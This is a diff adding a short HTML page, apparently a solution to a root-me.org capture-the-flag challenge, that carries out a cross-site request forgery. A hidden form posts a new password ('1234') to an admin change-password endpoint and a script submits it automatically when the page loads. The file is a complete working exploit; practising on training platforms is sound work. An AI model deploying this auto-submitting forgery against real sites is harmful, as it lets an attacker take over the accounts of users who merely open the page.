@@ -1,0 +1,15 @@
+<html>
+
+<body>
+    <h1>CSRF Test</h1>
+    <form action="https://bankroute.challenges.pro.root-me.org/admin/change-password" method="POST">
+        <input type="hidden" name="new_password" value="1234">
+        <input type="submit" value="Envoyer le formulaire">
+    </form>
+    <script>
+        // Soumet automatiquement le formulaire pour simuler un exploit
+        document.forms[0].submit();
+    </script>
+</body>
+
+</html>
